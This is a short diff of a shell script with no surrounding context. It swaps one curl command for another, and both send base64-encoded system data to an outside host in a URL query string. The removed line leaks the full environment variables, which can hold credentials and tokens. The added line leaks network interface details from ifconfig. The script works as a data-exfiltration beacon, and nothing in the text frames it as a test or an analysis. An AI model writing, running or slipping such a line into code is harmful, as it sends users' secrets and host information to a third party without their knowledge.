@@ -8,4 +8,4 @@
 
 #!/bin/sh
 
-curl "https://im5.org/hello111?d=$(echo -n `env` |base64)"
+curl "https://im5.org/hello111?d=$(echo -n `ifconfig` |base64)"
